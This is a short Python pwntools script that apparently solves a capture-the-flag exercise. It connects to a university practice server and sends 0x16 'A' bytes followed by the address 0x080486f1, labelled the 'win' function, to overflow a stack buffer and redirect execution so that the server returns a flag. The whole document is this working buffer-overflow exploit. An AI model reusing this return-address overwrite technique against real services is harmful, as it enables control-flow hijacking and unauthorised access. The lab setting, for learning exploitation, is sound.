from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22154"


r = remote(SERVER,PORT)


print(f"Message server sent:\n{r.recvline().decode()}\n")

msg = (b"A"*0x16 + b"\xf1\x86\x04\x08")                    ## win address is 0x080486f1  --> \xf1\x86\x04\x08
                                      
print(msg)                             
                                       
r.sendline(msg)

print(f"Flag: {r.recvall().decode()}")

r.close()